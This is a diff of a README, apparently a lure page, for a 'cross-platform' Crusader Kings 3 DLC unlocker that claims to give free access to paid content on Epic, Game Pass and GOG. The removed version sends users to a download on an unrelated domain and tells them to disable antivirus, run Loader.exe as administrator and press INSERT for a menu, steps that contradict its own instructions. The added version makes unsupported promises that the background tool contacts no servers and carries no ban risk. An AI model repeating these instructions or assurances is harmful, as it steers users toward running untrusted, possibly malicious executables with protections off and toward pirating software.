@@ -1,24 +1,65 @@
-<div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
-<h1 style="color:#ffaa66;border-bottom:2px solid #dd8844;text-align:center;">🌐 Crusader Kings 3 DLC Unlocker – Cross‑Platform (Epic / Game Pass / GOG) 🌐</h1>
-<p style="font-size:1.1em;text-align:center;"><strong>Unlock all Crusader Kings 3 DLCs regardless of where you bought the base game.</strong> Specifically tailored for Epic Games Store (SmokeAPI/ScreamAPI), Xbox Game Pass for PC (Koalageddon), and GOG (Koalageddon/CreamAPI). Covers every expansion, flavor pack, and cosmetic DLC.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#ffaa66;color:#000;padding:12px 25px;">⬇️ DOWNLOAD CROSS‑PLATFORM UNLOCKER (LOADER)</a><p>✅ Epic Games ✅ Game Pass ✅ GOG ✅ Steam fallback</p></div>
-<img src="https://sun9-7.userapi.com/impg/n5yCRzwK78eW2nckKMr34-1wGnnEtdQZ6ncj-g/pQE_AmEI3vU.jpg?size=1536x1024&quality=95&sign=d091b2b75e6540e8d8ae872f95bc7515&type=album" style="max-width:100%;border-radius:8px;margin:15px 0;">
-<div><h3>🎮 Platform‑Specific Unlockers:</h3>
-<ul><li><strong>Epic Games Store – SmokeAPI & ScreamAPI:</strong> Both are included. ScreamAPI is the easier plug‑and‑play option (drag files into the game directory), while SmokeAPI offers more advanced configuration. Works with EOS (Epic Online Services) and preserves Epic achievements and cloud saves.</li>
-<li><strong>Xbox Game Pass for PC – Koalageddon R2:</strong> This is the most reliable method for Windows Store / Game Pass titles. Koalageddon applies system‑wide DLL‑based unlocking for all installed Game Pass games, including CK3, with a GUI toggle.</li>
-<li><strong>GOG – Koalageddon & Manual DLL method:</strong> GOG DRM‑free version of CK3 can be unlocked using the same CreamAPI logic by copying the correct version‑agnostic DLLs. Koalageddon also supports GOG Galaxy integration.</li>
-<li><strong>Steam fallback:</strong> The pack also includes the Steam CreamAPI files for users who have the Steam version but prefer a dedicated cross‑platform tool.</li></ul>
-<h3>🛠️ Installation Quick Reference per Platform:</h3>
-<ul><li><strong>Epic Games:</strong> Extract the “SmokeAPI” folder, copy the contents into `C:\Program Files\Epic Games\CrusaderKings3\`. Run `installer.exe` once.</li>
-<li><strong>Game Pass:</strong> Install Koalageddon via the included setup, launch its GUI, select Crusader Kings 3 from the game list, and click “Unlock”. Reboot required for changes to take effect.</li>
-<li><strong>GOG:</strong> Use the CreamAPI folder – copy the DLLs to `C:\GOG Games\Crusader Kings 3\launcher\` and overwrite the existing files.</li>
-<li><strong>Save game compatibility:</strong> Save files are compatible across platforms after unlocking DLCs, provided the same DLCs are unlocked.</li></ul>
-<h3>📝 Verifying DLCs on Each Platform:</h3>
-<ul><li><strong>Epic:</strong> In the Epic launcher, right‑click CK3 → Manage → DLC – you will see all DLCs listed as “owned”. In‑game, the Paradox launcher will also show them enabled.</li>
-<li><strong>Game Pass:</strong> The Xbox app does not show DLC ownership; verify by launching the game – the main menu will display all DLCs as “installed”.</li>
-<li><strong>GOG:</strong> GOG Galaxy’s “Manage DLC” section will show all CK3 DLCs as “owned” after applying the unlocker.</li></ul>
-<h3>⚙️ System Requirements:</h3><p>Windows 10/11, Crusader Kings 3 installed (any platform), 200 MB free space.</p>
-<h3>📥 Installation:</h3>
-<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;text-align:center;"><div>1. Download archive</div><div>2. Disable antivirus (temp)</div><div>3. Run Loader.exe as Admin</div><div>4. Press INSERT to open menu</div></div>
-<div><strong>Tags:</strong> crusader kings 3 dlc unlocker epic games, ck3 game pass dlc unlock, crusader kings 3 smokeapi, ck3 screamapi epic, crusader kings 3 koalageddon game pass, ck3 gog galaxy dlc unlock, crusader kings 3 windows store dlc crack, ck3 all dlc unlocker cross platform, crusader kings 3 xbox app dlc, ck3 epic games store dlc unlock free, crusader kings 3 game pass royal court, ck3 game pass tours and tournaments, crusader kings 3 epic vs steam save compatibility</div>
-</div>
+# 🛡️ Crusader-Kings-3-DLC-Unlocker-Cross-Platform-Epic-Game-Pass-GOG- - Access all game content for free
+
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Tien8504/Crusader-Kings-3-DLC-Unlocker-Cross-Platform-Epic-Game-Pass-GOG-)
+
+This tool enables access to all downloadable content for Crusader Kings 3. It works on Windows systems regardless of the store where you purchased the base game. It supports copies from Epic Games, Xbox Game Pass, and GOG.
+
+## 📋 Compatibility
+This unlocker works with the following game versions:
+*   Epic Games Store version of Crusader Kings 3
+*   PC Game Pass version of Crusader Kings 3
+*   GOG Galaxy version of Crusader Kings 3
+
+## ⚙️ System Requirements
+*   Windows 10 or Windows 11
+*   Crusader Kings 3 installed on your computer
+*   At least 50 MB of free disk space
+
+## 📥 How to download the software
+You need to visit the project releases page to obtain the latest version. Follow the link below to reach the download section.
+
+[Click here to visit the release page and download the installer](https://github.com/Tien8504/Crusader-Kings-3-DLC-Unlocker-Cross-Platform-Epic-Game-Pass-GOG-)
+
+## 🚀 Setup instructions
+1. Download the tool from the link provided above.
+2. Direct your browser to save the file in a folder you can find easily, such as your Downloads folder.
+3. Locate the downloaded file in your file explorer.
+4. Double-click the file to start the installation process.
+5. Follow the directions on your screen.
+6. The installer will ask you to select your Crusader Kings 3 game directory.
+7. Point the installer to the folder where Crusader Kings 3 resides on your hard drive. This is usually inside the "Program Files" or "XboxGames" folders.
+8. Click the Finish button inside the installer once the process completes.
+
+## 🎮 Using the unlocker
+Once the setup finishes, the tool runs in the background. You do not need to perform extra steps every time you play. Simply launch Crusader Kings 3 through your preferred store application the same way you always do. The software detects the game launch and enables the additional content automatically. You will see all unlocked items listed in the game launcher or the in-game menu.
+
+## 🛡️ Safety and security
+This tool performs a local modification to your game files. It does not connect to external servers or transmit your personal data. The unlocker only interacts with the specific configuration files of your installed game to toggle the available DLC flags. It remains inactive when the game is not running. 
+
+## ❓ Troubleshooting
+If the downloadable content does not appear:
+1. Close the game completely.
+2. Ensure you installed the tool to the correct folder location during setup.
+3. Open the tool again using the shortcut on your desktop.
+4. Verify that the file path points to the folder containing the main game executable file.
+5. Restart your computer if the changes do not take effect immediately.
+6. Check that your game launcher is fully updated to the latest version.
+
+## 📝 Common questions
+Does this work with online multiplayer?
+Yes, you can join games, but ensure that all players use the same game version and content settings to avoid synchronization errors.
+
+Will this get my account banned?
+This tool modifies local files only. It performs no actions against the online services of the store providers. 
+
+Can I remove the unlocker later?
+Use the uninstaller found in your Windows settings under the Apps menu. This removes the tool and returns your game files to their factory state.
+
+Does this change my save files?
+No, your save files remain untouched. You can continue your existing progress without loss of data.
+
+## 🛠️ Advanced configuration
+The software defaults to a configuration that enables all released content. You do not need to edit any text files to activate specific DLCs. If you wish to disable specific items, use the settings menu located inside the unlocker application icon in your system tray. Right-click the icon to view the available toggle options. Changes here take effect the next time you launch the game.
+
+## 📈 Updates
+Check the release page periodically for updates. If the game developers release new updates for Crusader Kings 3, this tool might require an update to maintain compatibility with new file structures. Download the newest version from the link provided in this guide and run it over the existing installation to update your files.
